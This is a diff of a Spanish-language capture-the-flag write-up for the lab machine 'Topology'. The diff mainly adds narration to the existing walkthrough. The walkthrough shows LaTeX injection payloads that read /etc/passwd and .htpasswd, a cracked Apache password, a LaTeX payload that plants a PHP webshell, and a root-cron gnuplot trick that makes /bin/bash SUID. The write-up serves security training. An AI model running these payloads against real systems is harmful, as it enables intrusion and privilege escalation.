@@ -15,7 +15,7 @@ layout:
 
 # Topology
 
-`opology` es una máquina Linux de dificultad fácil que muestra una aplicación web `LaTeX` susceptible a una vulnerabilidad de inclusión de archivos locales (LFI). La explotación de la falla LFI permite la recuperación de un archivo `.htpasswd` que contiene una contraseña en hash. Al descifrar el hash de la contraseña, se obtiene acceso `SSH` a la máquina, lo que revela un cronjob `root` que ejecuta archivos `gnuplot`. La creación de un archivo `.plt` malicioso permite la escalada de privilegios.
+`Topology` es una máquina Linux de dificultad fácil que muestra una aplicación web `LaTeX` susceptible a una vulnerabilidad de inclusión de archivos locales (LFI). La explotación de la falla LFI permite la recuperación de un archivo `.htpasswd` que contiene una contraseña en hash. Al descifrar el hash de la contraseña, se obtiene acceso `SSH` a la máquina, lo que revela un cronjob `root` que ejecuta archivos `gnuplot`. La creación de un archivo `.plt` malicioso permite la escalada de privilegios.
 
 <figure><img src="../../.gitbook/assets/Topology.png" alt="" width="563"><figcaption></figcaption></figure>
 
@@ -160,32 +160,28 @@ Accederemos a [http://topology.htb](http://topology.htb) y nos encontraremos con
 
 <figure><img src="../../.gitbook/assets/imagen (2) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Al inspeccionar el sitio web, nos encontramos que haciendo `hovering`, se nos muestra un subdominio llamado `latex.topology.htb`.
 
 <figure><img src="../../.gitbook/assets/imagen (3).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
+Añadiremos esta nueva entrada en nuestro archivo `/etc/passwd`.
 
 ```bash
 ❯ cat /etc/hosts | grep topology
 10.10.11.217 topology.htb latex.topology.htb
 ```
 
+Al ingresar directamente a [http://latex.topology.htb](http://latex.topology.htb) y nos encontramos con la siguiente página web en la que podemos realizar `Directory Listing`.
 
+<figure><img src="../../.gitbook/assets/imagen (4).png" alt="" width="400"><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/imagen (4).png" alt=""><figcaption></figcaption></figure>
-
-
+Accederemos a[ http://latex.topology.htb/equation.php](http://latex.topology.htb/equation.php) y nos encontramos con la siguiente aplicación web en la cual nos permite introducir código **LaTeX**. Con lo cual, podríamos posteriormente comprobar si es vulnerable a `LaTeX Injection`.
 
 <figure><img src="../../.gitbook/assets/imagen (5).png" alt=""><figcaption></figcaption></figure>
 
-
-
 ### Subdomain Enumeration
 
-
+Realizamos una enumeración de subdominios del dominio principal de la página web. Al finalizar el análisis, nos encontramos con dos nuevos subdominios: `stats.topology.htb`y `dev.topology.htb`.
 
 ```bash
 ❯ wfuzz --hh=6767 -c --hc=404,400 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.topology.htb" http://topology.htb 2>/dev/null
@@ -209,44 +205,48 @@ Filtered Requests: 2276
 Requests/sec.: 25.28341
 ```
 
-
+Añadiremos estas nuevas entradas en nuestro archivo `/etc/hosts`.
 
 ```bash
 ❯ cat /etc/hosts | grep topology
 10.10.11.217 topology.htb latex.topology.htb stats.topology.htb dev.topology.htb
 ```
 
-
-
-
+Al acceder a [http://stats.topology.htb](topology.md#stats.topology.htb) nos encontramos con el siguiente contenido, el cual no parece tener contenido importante en él.
 
 <figure><img src="../../.gitbook/assets/5086_vmware_TdO4LXOO26.png" alt=""><figcaption></figcaption></figure>
 
+Al acceder a la página web de http://dev.topology.htb, nos encontramos con la siguiente página web en la cual requiere ingresar credenciales que no disponemos.
 
+Dado que nos encontramos ante una página web montada en un servidor de `Apache`, y por el tipo de autenticación que nos requiere ingresar, podemos pensar en que quizás esté utilizando `Basic Auth` y existan archivos de `.htaccess` o `.htpasswd` el cual contengan credenciales de usuarios.
+
+{% hint style="info" %}
+Los . htaccess se utilizan para indicar al servidor web que se comporte de una determinada manera, añadiendo, limitando o modificando funcionalidades por defecto. Entre las utilidades de uso más frecuente se encuentran las configuraciones de acceso a la web, las restricciones de seguridad, las redirecciones, etc.\
+\
+htpasswd es un archivo de texto que se usa para guardar los nombres de usuario y las contraseñas para la autenticación básica del Servidor HTTP Apache. El nombre del fichero se da en el fichero de configuración .
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/imagen (6).png" alt=""><figcaption></figcaption></figure>
 
-
-
 ## Initial Access
-
-
 
 ### LaTeX Injection
 
-
+Volveremos a la página de http://latex.topology.htb y probaremos de revisar si es vulnerable a `LaTeX Injection` el campo donde nos permite inyectar código `LaTeX`.
 
 <figure><img src="../../.gitbook/assets/imagen.png" alt="" width="519"><figcaption></figcaption></figure>
 
+Interceptaremos la solicitud con `BurpSuite`, y comprobamos que la solicitud se tramita a través del método `GET`. Por otro lado, se verifica que la variable `eqn` es dónde podemos introducir código `LaTeX`.
 
+En este ejemplo básico, introduciremos `Gzzcoo` y al enviar la solicitud, en la respuesta por parte del servidor se nos genera un PDF con el código `LaTeX`.
 
 <figure><img src="../../.gitbook/assets/imagen (7).png" alt=""><figcaption></figcaption></figure>
 
-
-
 ### Reading Files with LaTeX Injection
 
+Lo primero que intentaremos es intentar leer archivos arbitrarios del sistema mediante `LaTeX Injection`. A través de la siguiente inyección, trataremos de listar la primera línea del archivo `/etc/passwd`.
 
+Verificamos que al inyectar el código, comprobamos que en el PDF generado se muestra la primera línea del archivo listado.
 
 {% code overflow="wrap" %}
 ```latex
@@ -258,11 +258,9 @@ Requests/sec.: 25.28341
 ```
 {% endcode %}
 
-
-
 <figure><img src="../../.gitbook/assets/5093_vmware_ke5dpPspOM.png" alt=""><figcaption></figcaption></figure>
 
-
+Al intentar listar todo el contenido de `/etc/passwd`a través de la siguiente inyección `LaTeX`, se nos mostraba que había detectado un comando ilegal, con lo cual mediante el bucle, no podíamos listar el contenido entero del archivo.
 
 ```latex
 \newread\file
@@ -276,7 +274,7 @@ Requests/sec.: 25.28341
 
 <figure><img src="../../.gitbook/assets/imagen (8).png" alt=""><figcaption></figcaption></figure>
 
-
+Probamos de intentar ejecutar  el comando `id` mediante la siguiente inyección `LaTeX` para intentar obtener un **RCE**. pero tampoco obtuvimos el resultado esperado.
 
 ```latex
 \immediate\write18{id > output}
@@ -285,7 +283,9 @@ Requests/sec.: 25.28341
 
 <figure><img src="../../.gitbook/assets/imagen (9).png" alt=""><figcaption></figcaption></figure>
 
+En la siguiente página web,s e nos menciona un paquete de `code listing` en donde podemos importar código desde un archivo.
 
+En este caso, tratamos de incluir una imagen del contenido del archivo `/etc/passwd`, pero nos dio mensajes de error.
 
 {% embed url="https://www.overleaf.com/learn/latex/Code_listing#Importing_code_from_a_file" %}
 
@@ -295,17 +295,17 @@ Requests/sec.: 25.28341
 
 <figure><img src="../../.gitbook/assets/imagen (11).png" alt=""><figcaption></figcaption></figure>
 
+Para explotar la vulnerabilidad de **LaTeX Injection**, necesitamos inyectar código malicioso en un contexto donde LaTeX lo interprete y ejecute.
 
-
-
+En este caso, el sitio parece encerrar automáticamente la entrada entre símbolos `$ ... $`, lo que significa que cualquier comando que intentemos inyectar quedará dentro del modo matemático de LaTeX. Para romper esa estructura y ejecutar nuestros propios comandos, podemos intentar cerrar la expresión con `$` y luego insertar nuestra carga útil, finalizando con otro `$` para restaurar el formato esperado.
 
 {% embed url="https://tex.stackexchange.com/questions/52276/inline-equation-in-latex-with-text/52277#52277" %}
 
+Por ejemplo, la siguiente inyección nos permitiría leer el contenido de **/etc/passwd**:
 
+Si la inyección es exitosa, el contenido del archivo debería aparecer renderizado dentro del documento generado por LaTeX, tal y como se muestra en este caso.
 
-
-
-
+Por lo tanto, tenemos una manera de listar el contenido de archivos arbitrarios del sistema.
 
 ```latex
 $\lstinputlisting{/etc/passwd}$
@@ -313,9 +313,11 @@ $\lstinputlisting{/etc/passwd}$
 
 <figure><img src="../../.gitbook/assets/imagen (10).png" alt=""><figcaption></figcaption></figure>
 
-### Information Lekage
+### Information Leakage
 
+Después de diferentes pruebas para intentar obtener información que nos pudiese servir y no obtener resultado ninguno, pensamos en que quizás exista el archivo `.htpasswd` y `.htaccess` de la página web `dev.topology.htb` que encontramos anteriormente que nos requería ingresar credenciales.
 
+Por lo tanto, decidimos primero revisar la configuración de las páginas web de `Apache` que se encuentran habilitadas en el sistema objetivo, para tratar de revisar las rutas de configuración exacta de donde se encuentran los correspondientes archivos.
 
 ```latex
 $\lstinputlisting{/etc/apache2/sites-enabled/000-default.conf}$
@@ -323,7 +325,9 @@ $\lstinputlisting{/etc/apache2/sites-enabled/000-default.conf}$
 
 <figure><img src="../../.gitbook/assets/imagen (12).png" alt=""><figcaption></figcaption></figure>
 
+En el resultado obtenido, se nos mostró la configuración de las diferentes páginas web que llegamos a enumerar anteriormente.
 
+Revisamos que la configuración de `dev.topology.htb` se encuentra en `/var/www/dev`.
 
 {% tabs %}
 {% tab title="topology.htb" %}
@@ -339,7 +343,9 @@ $\lstinputlisting{/etc/apache2/sites-enabled/000-default.conf}$
 {% endtab %}
 {% endtabs %}
 
+Por lo tanto, sabiendo esta información podemos intentar listar el contenido del `.htaccess` de la página web indicada. Verificamos que en el PDF generado, se nos muestra el contenido del archivo que queríamos listar.
 
+Tal y como mencionábamos anteriormente, se estaba utilizando un `Basic Auth`para acceder a `dev.topology.htb`. También se nos confirma la ruta en donde se encuentra almacenada el archivo `.htpasswd` el cual debería contener credenciales de acceso a la página web.
 
 ```latex
 $\lstinputlisting{/var/www/dev/.htaccess}$
@@ -347,7 +353,7 @@ $\lstinputlisting{/var/www/dev/.htaccess}$
 
 <figure><img src="../../.gitbook/assets/imagen (17).png" alt=""><figcaption></figcaption></figure>
 
-
+Decidimos listar el contenido del `.htpasswd` en el resultado obtenido, se nos muestra las credenciales del usuario `vdaisley` en formato hash, probablemente `Apache MD5`.
 
 ```latex
 $\lstinputlisting{/var/www/dev/.htpasswd}$
@@ -355,7 +361,7 @@ $\lstinputlisting{/var/www/dev/.htpasswd}$
 
 <figure><img src="../../.gitbook/assets/imagen (18).png" alt=""><figcaption></figcaption></figure>
 
-
+Verificamos que el tipo de hash encontrado es `Apache MD5`. A través de `hashcat`, finalmente logramos crackear el hash y obtener las credenciales en texto plano.
 
 ```bash
 ❯ hashid '$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0'
@@ -377,9 +383,11 @@ OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8,
 $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0:calculus20
 ```
 
+Probamos de autenticarnos con las credenciales encontradas en [http://dev.topology.htb](http://dev.topology.htb), logramos acceder a la página web, pero no obtenemos información interesante que nos pueda servir.
+
 <figure><img src="../../.gitbook/assets/imagen (20).png" alt=""><figcaption></figcaption></figure>
 
-
+Probamos de autenticarnos al `SSH` con las credenciales del usuario `vdaisley`, finalmente logramos el acceso remoto a la máquina y visualizar la flag de **user.txt**.
 
 ```bash
 ❯ ssh vdaisley@10.10.11.217
@@ -403,14 +411,14 @@ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your 
 Last login: Sun Feb 16 18:59:18 2025 from 10.10.16.3ç
 vdaisley@topology:~$ export TERM=xterm
 vdaisley@topology:~$ cat user.txt 
-4313af6cb752b6ef8d67675b829c08f3
+4313af6cb7**********************
 ```
-
-
 
 ### Bypass Restrictions LaTeX Injection to perform Remote Code Execution
 
-otra manera
+[ippSec](https://ippsec.rocks/?), nos muestra también una manera de poder llegar a acceder al equipo mediante `LaTeX Injection` logrando realizar un `Bypass` de las restricciones que se nos indicaba anteriormente.
+
+En el siguiente ejemplo, creamos un archivo llamado `gzzcoo.php` que contenía una **webshell**.
 
 ```latex
 \newwrite\outfile\openout\outfile=gzzcoo.php\^^77rite\outfile{<?php system($_REQUEST['cmd']); ?>}\closeout\outfile
@@ -418,13 +426,13 @@ otra manera
 
 <figure><img src="../../.gitbook/assets/imagen (21).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
+Este archivo al parecer, es subido en [http://latex.topology.htb/tempfiles/](http://latex.topology.htb/tempfiles/), en el cual comprobamos el archivo creado.
 
 <figure><img src="../../.gitbook/assets/imagen (19).png" alt=""><figcaption></figcaption></figure>
 
+Probamos de utilizar la **webshell** subida, y se nos muestra la posibilidad de ejecutar comandos arbitrarios en el sistema objetivo.
 
+En este caso, el usuario que ejecuta los comandos era `www-data`, con lo cual si utilizamos este método, deberíamos posteriormente ganar acceso como el usuario `vdaisley`.
 
 ```bash
 ❯ curl -s 'http://latex.topology.htb/tempfiles/gzzcoo.php?cmd=id;hostname;ifconfig'
@@ -450,13 +458,11 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
 
-
-
 ## Privilege Escalation
 
 ### Basic Enumeration
 
-
+Realizaremos una enumeración básica con el usuario `vdaisley`para lograr verificar si disponemos de algún grupo interesante, permisos de `sudoers` o de algún binario con `SUID`. En este caso, no logramos obtener resultados interesantes para elevar nuestros privilegios.
 
 ```bash
 vdaisley@topology:~$ id
@@ -483,11 +489,13 @@ vdaisley@topology:~$ find / -perm -4000 2>/dev/null
 /usr/bin/chfn
 ```
 
-
-
 ### Monitoring Processes (Pspy64)
 
+Enumerando los directorios del sistema, nos encontramos con el directorio `/opt` el cual disponía de un directorio nombrado como `gnuplot`. Este directorio no disponemos del acceso correspondiente y verificamos que el propietario es el usuario `root`.
 
+{% hint style="info" %}
+gnuplot es un programa de línea de comandos y GUI que puede generar gráficos bidimensionales y tridimensionales de funciones, datos y ajustes de datos .
+{% endhint %}
 
 ```bash
 vdaisley@topology:~$ ls -l /opt/
@@ -498,7 +506,7 @@ vdaisley@topology:~$ ls -l /opt/gnuplot/
 ls: cannot open directory '/opt/gnuplot/': Permission denied
 ```
 
-
+Por lo tanto, probamos de enumerar los procesos que se encontraban en ejecución mediante `pspy64`. Este binario que disponemos en nuestro equipo local, lo compartiremos mediante un servidor web.
 
 ```bash
 ❯ ls -l pspy64
@@ -508,7 +516,7 @@ ls: cannot open directory '/opt/gnuplot/': Permission denied
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Desde el equipo comprometido, nos descargaremos el binario y le daremos los permisos de ejecución correspondientes.
 
 ```bash
 vdaisley@topology:/tmp$ wget 10.10.16.3/pspy64; chmod +x pspy64
@@ -523,7 +531,7 @@ pspy64                      100%[==========================================>]   
 2025-02-16 19:04:20 (1.58 MB/s) - ‘pspy64’ saved [3104768/3104768]
 ```
 
-
+Ejecutaremos el binario de `pspy64` para analizar los procesos que se encontraban en ejecución en el sistema. Después de un breve tiempo, comprobamos que se están ejecutando mediante una tarea `CRON`, la ejecución de archivos con extensión `.plt` en el directorio `/opt/gnuplot` y posteriormente se ejecutan con `gnuplot`.
 
 ```bash
 vdaisley@topology:/tmp$ ./pspy64 
@@ -567,9 +575,9 @@ done
 2025/02/16 19:05:01 CMD: UID=0     PID=3060   | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 
 ```
 
+Lo primero que deberemos realizar, es comprobar que tenemos permisos de escritura en el directorio mencionado. Por lo tanto, crearemos un nuevo archivo `.txt` y le daremos los permisos de ejecución, esto para simular que podemos crear archivos.
 
-
-
+Comprobamos que hemos logrado crear un archivo en el directorio `/opt/gnuplot` y también la capacidad de darle permisos de ejecución al archivo creado.
 
 ```bash
 vdaisley@topology:/opt$ echo 'gzzco was where' > /opt/gnuplot/gzzcoo.txt
@@ -580,7 +588,9 @@ vdaisley@topology:/opt$ ls -l /opt/gnuplot/gzzcoo.txt
 -rwxrwxr-x 1 vdaisley vdaisley 16 Feb 16 19:07 /opt/gnuplot/gzzcoo.txt
 ```
 
+Pensando que la tarea `CRON` que realiza la ejecución de los archivos `.plt` en dicho directorio sea `root`, tenemos una vía potencial para poder escalar privilegios.
 
+En esta primera comprobación crearemos un archivo `gzzcoo.plt` que ejecute el comando `whoami` y redirija el output al archivo `/tmp/whoami`. Le daremos los permisos correspondientes y comprobaremos de la existencia del archivo y de que se hayan asignado los permisos correspondientes.
 
 ```bash
 vdaisley@topology:/opt$ echo 'system "whoami > /tmp/whoami";' > /opt/gnuplot/gzzcoo.plt
@@ -589,7 +599,9 @@ vdaisley@topology:/opt$ ls -l /opt/gnuplot/gzzcoo.plt
 -rwxrwxr-x 1 vdaisley vdaisley 31 Feb 16 19:09 /opt/gnuplot/gzzcoo.plt
 ```
 
+Después de un breve tiempo, comprobamos en el directorio `/tmp` que aparece el archivo creado `whoami`. Revisando el archivo, comprobamos que el comando `whoami` ha dado como resultado el usuario `root`.
 
+Con esto, se confirma que tenemos una vía potencial de abusar de un script creado con extensión `.plt`en el directorio mencionado para que posteriormente sea ejecutado a través de la tarea `CRON` del usuario `root`.
 
 ```bash
 vdaisley@topology:/opt$ ls -l /tmp
@@ -607,7 +619,9 @@ vdaisley@topology:/opt$ cat /tmp/whoami
 root
 ```
 
+En este caso, reemplazaremos el contenido de `gzzcoo.plt` para que en este caso asigne permisos de `SUID`sobre el binario `/bin/bash`. Verificamos que se el script sigue estando en el directorio mencionado y dispone de los permisos de ejecución.
 
+Después de un breve tiempo, revisamos el binario `/bin/bash` y comprobamos que se le han asignado los permisos de `SUID`, con lo cual finalmente logramos convertirnos en usuario `root` y visualizamos la flag **root.txt** &#x20;
 
 ```bash
 vdaisley@topology:/opt$ echo 'system "chmod u+s /bin/bash";' > /opt/gnuplot/gzzcoo.plt
@@ -619,5 +633,5 @@ vdaisley@topology:/opt$ bash -p
 bash-5.0# whoami
 root
 bash-5.0# cat /root/root.txt 
-df00d35bed5ecb5dd1b29b881a104a7e
+df00d35bed**************************
 ```
